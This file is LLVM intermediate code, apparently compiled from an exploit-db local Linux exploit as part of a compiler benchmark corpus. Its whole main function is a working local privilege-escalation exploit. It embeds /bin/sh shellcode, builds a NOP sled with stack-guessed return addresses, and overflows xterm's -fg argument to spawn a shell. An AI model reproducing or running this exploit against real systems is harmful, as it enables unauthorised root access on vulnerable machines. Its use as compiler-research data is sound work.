; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_322.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_322.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.execshell = private unnamed_addr constant [69 x i8] c"\EB#^\8D\1E\89^\0B1\D2\89V\07\89V\0F\89V\14\88V\191\C0\B0;\8DN\0B\89\CARQSP\EB\18\E8\D8\FF\FF\FF/bin/sh\01\01\01\01\02\02\02\02\03\03\03\03\9A\04\04\04\04\07\04\00", align 16
@DEFAULT_OFFSET = common dso_local global i32 0, align 4
@BUFFER_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [46 x i8] c"Using offset of esp + %d (%x)\0ABuffer size %d\0A\00", align 1
@.str.1 = private unnamed_addr constant [23 x i8] c"can't allocate memory\0A\00", align 1
@.str.2 = private unnamed_addr constant [21 x i8] c"/usr/X11R6/bin/xterm\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"xterm\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"-fg\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca [69 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %6, align 8
  store i64* null, i64** %7, align 8
  store i8* null, i8** %8, align 8
  %13 = bitcast [69 x i8]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %13, i8* align 16 getelementptr inbounds ([69 x i8], [69 x i8]* @__const.main.execshell, i32 0, i32 0), i64 69, i1 false)
  %14 = load i32, i32* @DEFAULT_OFFSET, align 4
  store i32 %14, i32* %11, align 4
  %15 = load i32, i32* @BUFFER_SIZE, align 4
  store i32 %15, i32* %12, align 4
  %16 = load i32, i32* %4, align 4
  %17 = icmp sgt i32 %16, 1
  br i1 %17, label %18, label %23

18:                                               ; preds = %2
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 1
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 @atoi(i8* %21)
  store i32 %22, i32* %11, align 4
  br label %23

23:                                               ; preds = %18, %2
  %24 = load i32, i32* %4, align 4
  %25 = icmp sgt i32 %24, 2
  br i1 %25, label %26, label %31

26:                                               ; preds = %23
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 2
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @atoi(i8* %29)
  store i32 %30, i32* %12, align 4
  br label %31

31:                                               ; preds = %26, %23
  %32 = load i32, i32* %11, align 4
  %33 = call i32 (...) @get_esp()
  %34 = load i32, i32* %11, align 4
  %35 = add nsw i32 %33, %34
  %36 = load i32, i32* %12, align 4
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str, i64 0, i64 0), i32 %32, i32 %35, i32 %36)
  %38 = call i8* @malloc(i32 4096)
  store i8* %38, i8** %6, align 8
  %39 = load i8*, i8** %6, align 8
  %40 = icmp ne i8* %39, null
  br i1 %40, label %44, label %41

41:                                               ; preds = %31
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0))
  %43 = call i32 @exit(i32 0) #4
  unreachable

44:                                               ; preds = %31
  %45 = load i8*, i8** %6, align 8
  store i8* %45, i8** %8, align 8
  %46 = load i8*, i8** %8, align 8
  %47 = load i32, i32* %12, align 4
  %48 = getelementptr inbounds [69 x i8], [69 x i8]* %9, i64 0, i64 0
  %49 = call i32 @strlen(i8* %48)
  %50 = sub nsw i32 %47, %49
  %51 = call i32 @memset(i8* %46, i32 144, i32 %50)
  %52 = load i32, i32* %12, align 4
  %53 = getelementptr inbounds [69 x i8], [69 x i8]* %9, i64 0, i64 0
  %54 = call i32 @strlen(i8* %53)
  %55 = sub nsw i32 %52, %54
  %56 = load i8*, i8** %8, align 8
  %57 = sext i32 %55 to i64
  %58 = getelementptr inbounds i8, i8* %56, i64 %57
  store i8* %58, i8** %8, align 8
  store i32 0, i32* %10, align 4
  br label %59

59:                                               ; preds = %71, %44
  %60 = load i32, i32* %10, align 4
  %61 = getelementptr inbounds [69 x i8], [69 x i8]* %9, i64 0, i64 0
  %62 = call i32 @strlen(i8* %61)
  %63 = icmp slt i32 %60, %62
  br i1 %63, label %64, label %74

64:                                               ; preds = %59
  %65 = load i32, i32* %10, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [69 x i8], [69 x i8]* %9, i64 0, i64 %66
  %68 = load i8, i8* %67, align 1
  %69 = load i8*, i8** %8, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 1
  store i8* %70, i8** %8, align 8
  store i8 %68, i8* %69, align 1
  br label %71

71:                                               ; preds = %64
  %72 = load i32, i32* %10, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %10, align 4
  br label %59

74:                                               ; preds = %59
  %75 = load i8*, i8** %8, align 8
  %76 = bitcast i8* %75 to i64*
  store i64* %76, i64** %7, align 8
  store i32 0, i32* %10, align 4
  br label %77

77:                                               ; preds = %87, %74
  %78 = load i32, i32* %10, align 4
  %79 = icmp slt i32 %78, 2
  br i1 %79, label %80, label %90

80:                                               ; preds = %77
  %81 = call i32 (...) @get_esp()
  %82 = load i32, i32* %11, align 4
  %83 = add nsw i32 %81, %82
  %84 = sext i32 %83 to i64
  %85 = load i64*, i64** %7, align 8
  %86 = getelementptr inbounds i64, i64* %85, i32 1
  store i64* %86, i64** %7, align 8
  store i64 %84, i64* %85, align 8
  br label %87

87:                                               ; preds = %80
  %88 = load i32, i32* %10, align 4
  %89 = add nsw i32 %88, 1
  store i32 %89, i32* %10, align 4
  br label %77

90:                                               ; preds = %77
  %91 = load i64*, i64** %7, align 8
  %92 = bitcast i64* %91 to i8*
  store i8* %92, i8** %8, align 8
  %93 = load i8*, i8** %8, align 8
  store i8 0, i8* %93, align 1
  %94 = load i8*, i8** %6, align 8
  %95 = call i32 @execl(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0), i8* %94, i32* null)
  %96 = load i32, i32* %3, align 4
  ret i32 %96
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @get_esp(...) #2

declare dso_local i8* @malloc(i32) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
